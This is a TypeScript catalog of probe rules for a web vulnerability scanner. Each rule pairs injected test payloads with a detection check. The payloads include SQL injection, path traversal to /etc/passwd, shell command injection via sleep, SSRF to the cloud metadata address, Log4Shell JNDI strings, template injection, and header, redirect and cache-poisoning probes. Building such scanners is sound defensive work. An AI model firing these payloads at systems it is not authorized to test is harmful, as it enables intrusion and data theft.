// Probe-rule catalog, written in the active DSL (inject-probe's playbooks as data). These target
// common parameter names as EXAMPLES; a deployment authors its own ProbeRules against the app's
// real parameters (or a future "fuzz every param" mode). They demonstrate the three detect styles:
// canary reflection ("reflected"), a response-signature match (a DSL expr), and template-eval
// ("evaluated" — SSTI, the marker is the injected expression's product, minted per send).
import type { ProbeRule } from "../probe"

export const probeRules: ProbeRule[] = [
  {
    id: "reflected-xss-lead",
    category: "injection",
    severity: "medium",
    select: 'resp.bodyKind == "html" && req.query.q',
    inject: { into: "query", name: "q", payloads: ["<vx>{canary}</vx>"], canary: true },
    detect: "reflected", // the canary bounced back into the response → reflection lead
    message: "reflected input at {endpoint} (param q)",
  },
  {
    id: "sql-error-probe",
    category: "injection",
    severity: "high",
    select: "req.query.id",
    inject: { into: "query", name: "id", payloads: ["'", "1' OR '1'='1"] },
    detect: 'regex("SQL syntax|SQLSTATE|unterminated quoted string", resp.body)',
    message: "SQL error provoked at {endpoint} (param id)",
  },
  {
    id: "ssti-probe",
    category: "injection",
    severity: "critical",
    select: "req.query.q",
    // {template} → mintTemplateCanary().expr (a unique product); the engine syntaxes cover the
    // common template languages. "evaluated" fires when the product surfaces in the response.
    inject: { into: "query", name: "q", payloads: ["{{ {template} }}", "${ {template} }", "#{ {template} }", "{template}"] },
    detect: "evaluated",
    message: "server-side template injection at {endpoint} (param q)",
  },
  {
    id: "path-traversal-probe",
    category: "injection",
    severity: "high",
    select: "req.query.file",
    inject: { into: "query", name: "file", payloads: ["../../../../../../etc/passwd", "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"] },
    detect: 'regex("root:.*:0:0:", resp.body)', // /etc/passwd signature
    message: "path traversal at {endpoint} (param file)",
    tags: ["injection", "lfi"],
  },
  {
    // Redirect param → does Location point off to our canary host? detect over the probe response.
    id: "open-redirect-probe",
    category: "redirect",
    severity: "medium",
    select: "req.query.next",
    inject: { into: "query", name: "next", payloads: ["https://vxredir.example/x", "//vxredir.example/x"] },
    detect: 'starts_with(resp.header.location, "https://vxredir.example") || starts_with(resp.header.location, "//vxredir.example")',
    message: "open redirect at {endpoint} (param next)",
    tags: ["redirect"],
  },
  {
    // CRLF in a param that reaches a response header → does our injected header surface?
    id: "crlf-header-injection-probe",
    category: "injection",
    severity: "high",
    select: "req.query.next",
    inject: { into: "query", name: "next", payloads: ["%0d%0aVX-Injected:1", "\r\nVX-Injected:1"] },
    detect: "resp.header.vx-injected", // the injected header appeared in the response
    message: "CRLF / header injection at {endpoint} (param next)",
    tags: ["injection", "crlf"],
  },
  {
    // Time-based command injection: a shell-metachar payload that sleeps. Single-shot threshold (a
    // real deployment diffs against a baseline); a slow probe response is a strong lead.
    id: "command-injection-time-probe",
    category: "injection",
    severity: "critical",
    select: "req.query.host",
    inject: { into: "query", name: "host", payloads: ["127.0.0.1; sleep 5", "127.0.0.1 && sleep 5", "$(sleep 5)"] },
    detect: "timeMs > 4000",
    message: "possible time-based command injection at {endpoint} (param host)",
    tags: ["injection", "rce"],
  },
  {
    // SSRF via URL-accepting params: inject cloud metadata and internal addresses. A response
    // containing AWS metadata or SSH banner proves the server fetched an internal resource.
    id: "ssrf-probe",
    category: "injection",
    severity: "critical",
    select: "req.query.url || req.query.uri || req.query.src || req.query.href || req.query.callback",
    inject: { into: "query", name: "url", payloads: ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:22/", "http://[::1]/"] },
    detect: 'regex("ami-id|instance-id|iam/|meta-data/|SSH-2\\.0-|OpenSSH", resp.body)',
    message: "SSRF — internal resource fetched via {endpoint} (param url)",
    tags: ["injection", "ssrf"],
  },
  {
    // Host header injection: the server reflects a manipulated Host header into the response body
    // (password-reset links, absolute URLs). A reflected canary proves the Host value is trusted.
    id: "host-header-injection-probe",
    category: "injection",
    severity: "high",
    select: 'req.method == "GET" && resp.status == 200',
    inject: { into: "header", name: "host", payloads: ["evil.{canary}.example"], canary: true },
    detect: "reflected",
    message: "Host header reflected in response at {endpoint}",
    tags: ["injection", "host-header"],
  },
  {
    // HTTP method override: a 403-ed endpoint may honour X-HTTP-Method-Override to bypass verb-based
    // ACLs. A 2xx response after injecting the override = access control bypass.
    id: "method-override-probe",
    category: "access-control",
    severity: "high",
    select: 'resp.status == 403 && req.method == "GET"',
    inject: { into: "header", name: "x-http-method-override", payloads: ["POST", "PUT", "DELETE", "PATCH"] },
    detect: "resp.status >= 200 && resp.status < 300",
    message: "HTTP method override bypassed access control at {endpoint}",
    tags: ["access-control", "bypass"],
  },
  {
    // Log4Shell / JNDI lookup: inject a JNDI expression in logged parameters. If the response
    // leaks a JNDI/Log4j error, the server attempted the lookup — even without OOB confirmation,
    // the error trace is strong evidence of a vulnerable Log4j.
    id: "log4shell-probe",
    category: "injection",
    severity: "critical",
    select: "req.query.search || req.query.q || req.query.username || req.query.name",
    inject: { into: "query", name: "search", payloads: ["${jndi:ldap://127.0.0.1/a}", "${jndi:dns://127.0.0.1/a}"] },
    detect: 'regex("javax\\.naming|JndiLookup|JNDI|log4j|InitialContext|NamingException", resp.body)',
    message: "Log4Shell / JNDI lookup error at {endpoint} (param search)",
    tags: ["injection", "rce", "log4shell"],
  },
  {
    // Cache poisoning via X-Forwarded-Host: if the server trusts this header and reflects it into
    // the HTML (base tag, script src, canonical URL), a cache in front may store the poisoned page.
    id: "cache-poison-xfh-probe",
    category: "misconfiguration",
    severity: "high",
    select: 'req.method == "GET" && resp.status == 200 && resp.bodyKind == "html"',
    inject: { into: "header", name: "x-forwarded-host", payloads: ["{canary}.example.com"], canary: true },
    detect: "reflected",
    message: "cache poisoning via X-Forwarded-Host reflection at {endpoint}",
    tags: ["misconfiguration", "cache-poison"],
  },
]
